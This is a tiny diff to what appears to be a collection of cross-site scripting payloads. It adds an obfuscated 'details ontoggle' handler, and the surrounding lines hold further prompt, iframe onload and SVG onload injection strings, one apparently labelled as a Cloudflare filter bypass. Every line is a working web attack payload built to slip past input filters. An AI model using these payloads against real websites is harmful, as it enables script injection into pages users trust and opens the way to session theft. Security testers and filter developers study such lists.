@@ -1,4 +1,4 @@
-
+<details open ontoggle​=content['al'%2B'ert'](1) >
  "*prompt(document.domain)*"
  "><<iframe onx=() onload=(alert)(6)>
  &gt;&lt;Svg Only=1 OnLoad=confirm(atob("Q2xvdWRmbGFyZSBYU1MgQG1fa2VsZXBjZQ=="))&gt;
